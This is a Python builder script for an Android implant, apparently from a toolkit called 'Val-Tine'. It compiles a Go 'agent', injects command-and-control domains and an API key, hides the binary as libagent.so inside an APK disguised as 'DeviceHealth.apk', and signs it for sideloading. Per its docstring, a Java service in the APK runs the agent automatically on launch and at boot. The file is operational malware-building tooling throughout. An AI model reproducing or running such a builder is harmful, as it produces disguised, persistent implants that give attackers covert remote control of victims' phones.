#!/usr/bin/env python3
"""
build_android.py — Android APK builder

Compiles the Go agent for Android arm64, injects C2 config,
packages it as a native library inside an APK, and signs it.

The APK itself acts as the stager: Java service extracts and runs
the Go binary (libagent.so) automatically on launch + boot.

Usage:
  python3 build_android.py
  python3 build_android.py --domain abc.supabase.co --apikey eyJ...
"""

import argparse
import os
import shutil
import subprocess
import sys
import tempfile

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
ANDROID_DIR = os.path.join(SCRIPT_DIR, "android")
AGENT_DIR = os.path.join(ANDROID_DIR, "agent")
IS_WIN = sys.platform == "win32"
AGENT_SRC = os.path.join(AGENT_DIR, "main.go")
AGENT_MOD = os.path.join(AGENT_DIR, "go.mod")


def _colors_supported():
    """Check if the terminal supports ANSI colors."""
    if IS_WIN:
        # Enable ANSI on Windows 10+ by setting console mode
        try:
            import ctypes
            kernel32 = ctypes.windll.kernel32
            kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
            return True
        except Exception:
            return False
    return hasattr(sys.stdout, "isatty") and sys.stdout.isatty()

_USE_COLORS = _colors_supported()


def log(msg, tag="INFO"):
    if _USE_COLORS:
        colors = {"OK": "\033[92m", "ERR": "\033[91m", "WARN": "\033[93m", "INFO": "\033[94m"}
        reset = "\033[0m"
        c = colors.get(tag, "")
        print(f"  {c}[{tag}]{reset} {msg}")
    else:
        print(f"  [{tag}] {msg}")


def run(cmd, cwd=None, env=None, check=True):
    """Run shell command, print stderr on failure."""
    merged_env = os.environ.copy()
    if env:
        merged_env.update(env)
    result = subprocess.run(cmd, shell=True, cwd=cwd, env=merged_env,
                            capture_output=True, text=True)
    if check and result.returncode != 0:
        log(f"Command failed: {cmd}", "ERR")
        if result.stderr:
            for line in result.stderr.strip().split("\n")[-10:]:
                log(line, "ERR")
        sys.exit(1)
    return result


def read_env_config():
    """Read C2 config from .env file."""
    config = {}
    env_file = os.path.join(SCRIPT_DIR, ".env")
    if os.path.exists(env_file):
        with open(env_file) as f:
            for line in f:
                line = line.strip()
                if "=" in line and not line.startswith("#"):
                    key, val = line.split("=", 1)
                    config[key.strip()] = val.strip().strip('"').strip("'")
    return config


def find_android_sdk():
    """Find Android SDK path."""
    android_home = os.environ.get("ANDROID_HOME") or os.environ.get("ANDROID_SDK_ROOT")
    if android_home and os.path.isdir(android_home):
        return android_home
    candidates = [
        os.path.expanduser("~/Android/Sdk"),
        os.path.expanduser("~/Library/Android/sdk"),
        "/usr/lib/android-sdk",
        "/opt/android-sdk",
    ]
    if IS_WIN:
        localappdata = os.environ.get("LOCALAPPDATA", "")
        if localappdata:
            candidates.insert(0, os.path.join(localappdata, "Android", "Sdk"))
        # Android Studio default on Windows
        candidates.insert(1, os.path.expanduser("~\\AppData\\Local\\Android\\Sdk"))
    for c in candidates:
        if os.path.isdir(c):
            return c
    return None


def find_or_prompt_android_sdk():
    """Find Android SDK or ask the user for the path."""
    sdk = find_android_sdk()
    if sdk:
        return sdk
    log("Android SDK not found automatically.", "WARN")
    log("Checked: ANDROID_HOME env var and common install paths.", "WARN")
    print()
    path = input("[?] Enter your Android SDK path (or press Enter to skip): ").strip().strip('"').strip("'")
    if path and os.path.isdir(path):
        return path
    if path:
        log(f"Path does not exist: {path}", "ERR")
    return None


# ============================================================
# STAGE 1: Compile Go Agent
# ============================================================

def compile_agent(domain1, domain2, apikey, arch="arm64"):
    """Compile Go agent for Android with config injected."""

    log(f"Reading agent source: {AGENT_SRC}")
    with open(AGENT_SRC, "r") as f:
        source = f.read()

    # Inject C2 config via placeholder replacement
    source = source.replace("PLACEHOLDER_C2_DOMAIN_1", domain1)
    source = source.replace("PLACEHOLDER_C2_DOMAIN_2", domain2 or "")
    source = source.replace("PLACEHOLDER_C2_APIKEY", apikey)

    # Verify placeholders were replaced
    if "PLACEHOLDER_C2" in source:
        log("Failed to inject all C2 config placeholders", "ERR")
        sys.exit(1)

    # Write patched source to temp dir
    tmpdir = tempfile.mkdtemp(prefix="valtine_android_")
    patched_src = os.path.join(tmpdir, "main.go")
    with open(patched_src, "w") as f:
        f.write(source)

    # Copy go.mod
    if os.path.exists(AGENT_MOD):
        shutil.copy2(AGENT_MOD, os.path.join(tmpdir, "go.mod"))
    else:
        with open(os.path.join(tmpdir, "go.mod"), "w") as f:
            f.write("module agent\n\ngo 1.21\n")

    # Map arch to GOARCH
    goarch_map = {"arm64": "arm64", "arm": "arm", "x86_64": "amd64", "x86": "386"}
    goarch = goarch_map.get(arch, "arm64")

    out_path = os.path.join(tmpdir, "agent")
    env = {
        "GOOS": "android",
        "GOARCH": goarch,
        "CGO_ENABLED": "0",
    }

    log(f"Compiling Go agent for android/{goarch}...")
    run(f'go build -trimpath -ldflags="-s -w" -o "{out_path}" .',
        cwd=tmpdir, env=env)

    size = os.path.getsize(out_path)
    log(f"Compiled: {size:,} bytes ({size // 1024} KB)", "OK")

    return out_path, tmpdir


# ============================================================
# STAGE 2: Package into APK
# ============================================================

def package_agent_into_apk(binary_path, arch="arm64"):
    """Copy compiled binary as libagent.so into jniLibs for APK packaging."""

    # Map arch to ABI directory name
    abi_map = {
        "arm64": "arm64-v8a",
        "arm": "armeabi-v7a",
        "amd64": "x86_64",
        "x86_64": "x86_64",
        "386": "x86",
        "x86": "x86",
    }
    abi = abi_map.get(arch, "arm64-v8a")

    jnilib_dir = os.path.join(ANDROID_DIR, "app", "src", "main", "jniLibs", abi)
    os.makedirs(jnilib_dir, exist_ok=True)

    dest = os.path.join(jnilib_dir, "libagent.so")
    shutil.copy2(binary_path, dest)
    os.chmod(dest, 0o755)

    log(f"Placed binary at: jniLibs/{abi}/libagent.so", "OK")
    return jnilib_dir


def _ensure_keystore():
    """Generate a release keystore if one doesn't exist. Gradle signing config references this."""
    keystore = os.path.join(ANDROID_DIR, "release.keystore")
    if os.path.exists(keystore):
        return keystore
    log("Generating release keystore for APK signing...")
    keytool = shutil.which("keytool")
    if not keytool:
        log("keytool not found — install Java JDK", "ERR")
        sys.exit(1)
    run(
        f'"{keytool}" -genkeypair -v -keystore "{keystore}" '
        f'-keyalg RSA -keysize 2048 -validity 10000 '
        f'-alias releasekey -storepass android -keypass android '
        f'-dname "CN=App,OU=Dev,O=Dev,L=US,S=US,C=US"'
    )
    log("Keystore generated", "OK")
    return keystore


def _find_gradle_cmd():
    """Find the Gradle command: wrapper (gradlew/gradlew.bat) or system gradle."""
    if IS_WIN:
        wrapper = os.path.join(ANDROID_DIR, "gradlew.bat")
    else:
        wrapper = os.path.join(ANDROID_DIR, "gradlew")

    if os.path.exists(wrapper):
        if not IS_WIN:
            os.chmod(wrapper, 0o755)
        return wrapper

    # No wrapper — try to generate one using system gradle
    system_gradle = shutil.which("gradle")
    if system_gradle:
        log("gradlew not found, generating wrapper with system Gradle...", "WARN")
        # Use --gradle-version 8.5 to match AGP 8.2.0 compatibility
        # Without this, system Gradle overwrites gradle-wrapper.properties with its own version
        run(f'"{system_gradle}" wrapper --gradle-version 8.5', cwd=ANDROID_DIR, check=False)
        if os.path.exists(wrapper):
            if not IS_WIN:
                os.chmod(wrapper, 0o755)
            return wrapper
        # Wrapper generation failed, fall back to system gradle directly
        log("Wrapper generation failed, using system Gradle directly", "WARN")
        return system_gradle

    log("Neither gradlew nor system Gradle found.", "ERR")
    log("Install Gradle: https://gradle.org/install/", "ERR")
    sys.exit(1)


def build_apk():
    """Build APK using Gradle wrapper or system Gradle."""

    gradle_cmd = _find_gradle_cmd()

    # Check for local.properties — SDK path is required for Gradle to build
    local_props = os.path.join(ANDROID_DIR, "local.properties")
    sdk_path = None

    # Read existing local.properties to see if sdk.dir is already set
    if os.path.exists(local_props):
        with open(local_props) as f:
            content = f.read()
        if "sdk.dir" in content:
            log("Using existing local.properties")
            sdk_path = "existing"

    if not sdk_path:
        sdk_path = find_or_prompt_android_sdk()
        if not sdk_path:
            log("Android SDK is required to build the APK.", "ERR")
            log("Install Android SDK: https://developer.android.com/studio", "ERR")
            log("Or set ANDROID_HOME environment variable.", "ERR")
            sys.exit(1)
        # Escape backslashes for local.properties on Windows
        sdk_prop = sdk_path.replace("\\", "\\\\") if IS_WIN else sdk_path
        with open(local_props, "w") as f:
            f.write(f"sdk.dir={sdk_prop}\n")
        log(f"Created local.properties with sdk.dir={sdk_path}")

    # Generate keystore before Gradle build so signing config can find it
    _ensure_keystore()

    log("Building APK with Gradle...")
    result = run(f'"{gradle_cmd}" assembleRelease --no-daemon -q', cwd=ANDROID_DIR, check=False)

    # Gradle with signing config produces app-release.apk (signed), not app-release-unsigned.apk
    release_dir = os.path.join(ANDROID_DIR, "app", "build", "outputs", "apk", "release")
    apk_path = None
    if result.returncode == 0 and os.path.isdir(release_dir):
        # Prefer signed APK, fall back to unsigned
        for name in ["app-release.apk", "app-release-unsigned.apk"]:
            candidate = os.path.join(release_dir, name)
            if os.path.exists(candidate):
                apk_path = candidate
                break

    if not apk_path:
        log("Release build failed, trying debug build...", "WARN")
        if result.stderr:
            for line in result.stderr.strip().split("\n")[-5:]:
                log(line, "WARN")
        run(f'"{gradle_cmd}" assembleDebug --no-daemon -q', cwd=ANDROID_DIR)
        apk_path = os.path.join(ANDROID_DIR, "app", "build", "outputs", "apk", "debug", "app-debug.apk")

    if not apk_path or not os.path.exists(apk_path):
        log("APK build failed — no output APK found", "ERR")
        sys.exit(1)

    size = os.path.getsize(apk_path)
    log(f"APK built: {size:,} bytes ({size // 1024} KB)", "OK")
    return apk_path


# ============================================================
# STAGE 3: Sign APK
# ============================================================

def sign_apk(apk_path, output_path):
    """Copy the Gradle-signed APK to output, or manually sign if unsigned."""

    is_signed = "unsigned" not in os.path.basename(apk_path) and "debug" not in os.path.basename(apk_path)

    if is_signed:
        # Gradle already signed with v1+v2 via the signing config
        log("APK already signed by Gradle (v1+v2)")
        shutil.copy2(apk_path, output_path)
    else:
        # Fallback: manual signing for unsigned APKs
        keystore = os.path.join(ANDROID_DIR, "release.keystore")
        ks_pass = "android"
        key_alias = "releasekey"

        if not os.path.exists(keystore):
            _ensure_keystore()

        log("Signing APK with jarsigner...")
        run(
            f'jarsigner -keystore "{keystore}" '
            f'-storepass {ks_pass} -keypass {ks_pass} '
            f'-digestalg SHA-256 -sigalg SHA256withRSA '
            f'-signedjar "{output_path}" "{apk_path}" {key_alias}'
        )

        # Try apksigner for v2 signing
        sdk_path = find_android_sdk()
        if sdk_path:
            bt_dir = os.path.join(sdk_path, "build-tools")
            if os.path.isdir(bt_dir):
                versions = sorted(os.listdir(bt_dir), reverse=True)
                for v in versions:
                    apksigner_name = "apksigner.bat" if IS_WIN else "apksigner"
                    apksigner = os.path.join(bt_dir, v, apksigner_name)
                    if os.path.exists(apksigner):
                        log("Applying v2 signature with apksigner...")
                        result = run(
                            f'"{apksigner}" sign --ks "{keystore}" '
                            f'--ks-pass pass:{ks_pass} --ks-key-alias {key_alias} '
                            f'--key-pass pass:{ks_pass} "{output_path}"',
                            check=False
                        )
                        if result.returncode == 0:
                            log("v2 signature applied", "OK")
                        break

    size = os.path.getsize(output_path)
    log(f"Signed APK: {output_path} ({size // 1024} KB)", "OK")


# ============================================================
# CLEANUP
# ============================================================

def cleanup(tmpdir):
    """Remove temp build directory."""
    if tmpdir and os.path.exists(tmpdir):
        shutil.rmtree(tmpdir, ignore_errors=True)


# ============================================================
# MAIN
# ============================================================

def main():
    parser = argparse.ArgumentParser(description="Build Android APK")
    parser.add_argument("--domain", help="Primary Supabase domain")
    parser.add_argument("--domain2", help="Secondary Supabase domain")
    parser.add_argument("--apikey", help="Supabase API key")
    parser.add_argument("--arch", default="arm64,arm",
                        help="Target architectures, comma-separated (default: arm64,arm). Options: arm64, arm, x86_64, x86")
    parser.add_argument("--output", default="DeviceHealth.apk", help="Output APK filename")
    args = parser.parse_args()

    print()
    print("  ╔══════════════════════════════════════╗")
    print("  ║   Val-Tine Android Builder            ║")
    print("  ╚══════════════════════════════════════╝")
    print()

    # Read config from .env or CLI args
    config = read_env_config()

    domain1 = args.domain or config.get("VITE_SUPABASE_URL", "").replace("https://", "").rstrip("/")
    domain2 = args.domain2 or config.get("VITE_SUPABASE_URL_2", "").replace("https://", "").rstrip("/")
    # Support both key names (setup.py writes PUBLISHABLE_KEY, some configs use ANON_KEY)
    apikey = (args.apikey
              or config.get("VITE_SUPABASE_PUBLISHABLE_KEY", "")
              or config.get("VITE_SUPABASE_ANON_KEY", ""))

    if not domain1 or not apikey:
        log("C2 config required. Set values in .env or use --domain/--apikey flags.", "ERR")
        log("  .env keys: VITE_SUPABASE_URL, VITE_SUPABASE_PUBLISHABLE_KEY", "ERR")
        sys.exit(1)

    # Parse arch list
    archs = [a.strip() for a in args.arch.split(",")]
    valid_archs = {"arm64", "arm", "x86_64", "x86"}
    for a in archs:
        if a not in valid_archs:
            log(f"Invalid architecture: {a}. Valid: {', '.join(valid_archs)}", "ERR")
            sys.exit(1)

    log(f"C2 Domain: {domain1}")
    if domain2:
        log(f"C2 Domain 2: {domain2}")
    log(f"Target arch(s): {', '.join(archs)}")

    # Check prerequisites
    if not shutil.which("go"):
        log("Go compiler not found in PATH. Install from https://go.dev/dl/", "ERR")
        sys.exit(1)

    if not os.path.exists(AGENT_SRC):
        log(f"Agent source not found: {AGENT_SRC}", "ERR")
        sys.exit(1)

    # Check Gradle wrapper or system Gradle
    gradlew = os.path.join(ANDROID_DIR, "gradlew.bat" if IS_WIN else "gradlew")
    if not os.path.exists(gradlew) and not shutil.which("gradle"):
        log("Neither gradlew nor Gradle found.", "ERR")
        log("Install Gradle: https://gradle.org/install/", "ERR")
        log("  Linux (apt): sudo apt install gradle", "ERR")
        log("  macOS (brew): brew install gradle", "ERR")
        log("  Windows (winget): winget install Gradle.Gradle", "ERR")
        sys.exit(1)

    tmpdirs = []
    try:
        # Stage 1: Compile Go Agent for each architecture
        print()
        log("--- Stage 1: Compile Go Agent ---")
        for arch in archs:
            binary_path, tmpdir = compile_agent(domain1, domain2, apikey, arch)
            tmpdirs.append(tmpdir)
            package_agent_into_apk(binary_path, arch)
            log(f"Packaged for {arch}", "OK")

        # Stage 2: Build APK (contains all architectures)
        print()
        log("--- Stage 2: Build APK ---")
        apk_path = build_apk()

        # Stage 3: Sign
        print()
        log("--- Stage 3: Sign APK ---")
        output_path = os.path.join(SCRIPT_DIR, args.output)
        sign_apk(apk_path, output_path)

    finally:
        # Cleanup
        for td in tmpdirs:
            cleanup(td)
        # Clean jniLibs
        jniLibs = os.path.join(ANDROID_DIR, "app", "src", "main", "jniLibs")
        if os.path.isdir(jniLibs):
            shutil.rmtree(jniLibs, ignore_errors=True)

    print()
    log("Build complete!", "OK")
    log(f"Output: {args.output}", "OK")
    log(f"Architectures: {', '.join(archs)}", "OK")
    log(f"Min Android version: 6.0 (Marshmallow)", "OK")
    print()
    print(f"  Install: adb install {args.output}")
    print(f"  Or transfer {args.output} to device and install")
    print()
    print("  If 'App not installed' — check:")
    print("    1. 'Install unknown apps' is enabled for your file manager")
    print("    2. No previous version installed with a different signature")
    print("       (uninstall first: adb uninstall com.devicehealth.service)")
    print()


if __name__ == "__main__":
    main()
